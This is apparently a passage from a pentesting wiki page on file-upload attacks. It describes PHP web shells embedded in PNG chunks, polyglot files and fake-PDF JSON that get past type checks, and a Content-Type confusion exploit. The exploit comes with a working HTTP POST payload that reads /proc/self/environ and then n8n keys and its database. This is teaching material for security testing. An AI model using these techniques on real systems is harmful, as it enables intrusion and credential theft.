+Embedding a PHP shell in the IDAT chunk of a PNG file can effectively bypass certain image processing operations. The functions `imagecopyresized` and `imagecopyresampled` from PHP-GD are particularly relevant in this context, as they are commonly used for resizing and resampling images, respectively. The ability of the embedded PHP shell to remain unaffected by these operations is a significant advantage for certain use cases.
+
+A detailed exploration of this technique, including its methodology and potential applications, is provided in the following article: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). This resource offers a comprehensive understanding of the process and its implications.
+
+More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
+
+## Polyglot Files
+
+Polyglot files serve as a unique tool in cybersecurity, acting as chameleons that can validly exist in multiple file formats simultaneously. An intriguing example is a [GIFAR](https://en.wikipedia.org/wiki/Gifar), a hybrid that functions both as a GIF and a RAR archive. Such files aren't limited to this pairing; combinations like GIF and JS or PPT and JS are also feasible.
+
+The core utility of polyglot files lies in their capacity to circumvent security measures that screen files based on type. Common practice in various applications entails permitting only certain file types for upload—like JPEG, GIF, or DOC—to mitigate the risk posed by potentially harmful formats (e.g., JS, PHP, or Phar files). However, a polyglot, by conforming to the structural criteria of multiple file types, can stealthily bypass these restrictions.
+
+Despite their adaptability, polyglots do encounter limitations. For instance, while a polyglot might simultaneously embody a PHAR file (PHp ARchive) and a JPEG, the success of its upload might hinge on the platform's file extension policies. If the system is stringent about allowable extensions, the mere structural duality of a polyglot may not suffice to guarantee its upload.
+
+More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
+
+### Upload valid JSONs like if it was PDF
+
+How to avoid file type detections by uploading a valid JSON file even if not allowed by faking a PDF file (techniques from **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):
+
+- **`mmmagic` library**: As long as the `%PDF` magic bytes are in the first 1024 bytes it’s valid (get example from post)
+- **`pdflib` library**: Add a fake PDF format inside a filed of the JSON so the library thinks it’s a pdf (get example from post)
+- **`file` binary**: It can read up to 1048576 bytes from a file. Just create a JSON bigger than that so it cannot parse the content as a json and then inside the JSON put the initial part of a real PDF and it’ll think it’s a PDF
+
+### Content-Type confusion to arbitrary file read
+
+Some upload handlers **trust the parsed request body** (e.g., `context.getBodyData().files`) and later **copy the file from `file.filepath`** without first enforcing `Content-Type: multipart/form-data`. If the server accepts `application/json`, you can supply a fake `files` object pointing `filepath` to **any local path**, turning the upload flow into an arbitrary file read primitive.
+
+Example POST against a form workflow returning the uploaded binary in the HTTP response:
+
+```http
+POST /form/vulnerable-form HTTP/1.1
+Host: target
+Content-Type: application/json
+
+{
+  "files": {
+    "document": {
+      "filepath": "/proc/self/environ",
+      "mimetype": "image/png",
+      "originalFilename": "x.png"
+    }
+  }
+}
+```
+
+Backend copies `file.filepath`, so the response returns that path’s content. Common chain: read `/proc/self/environ` to learn `$HOME`, then `$HOME/.n8n/config` for keys and `$HOME/.n8n/database.sqlite` for user identifiers.
+
+## References
+
+- [n8n form upload Content-Type confusion → arbitrary file read PoC](https://github.com/Chocapikk/CVE-2026-21858)
+- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
+- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
+- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
+- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
+- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
+- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
+- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
+- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
+- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
+- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
+- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
+- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
+- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
+- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
+- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
+- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
+- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
+- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
+- [When Audits Fail: From Pre-Auth SSRF to RCE in TRUfusion Enterprise](https://www.rcesecurity.com/2026/02/when-audits-fail-from-pre-auth-ssrf-to-rce-in-trufusion-enterprise/)
+
+{{#include ../../banners/hacktricks-training.md}}
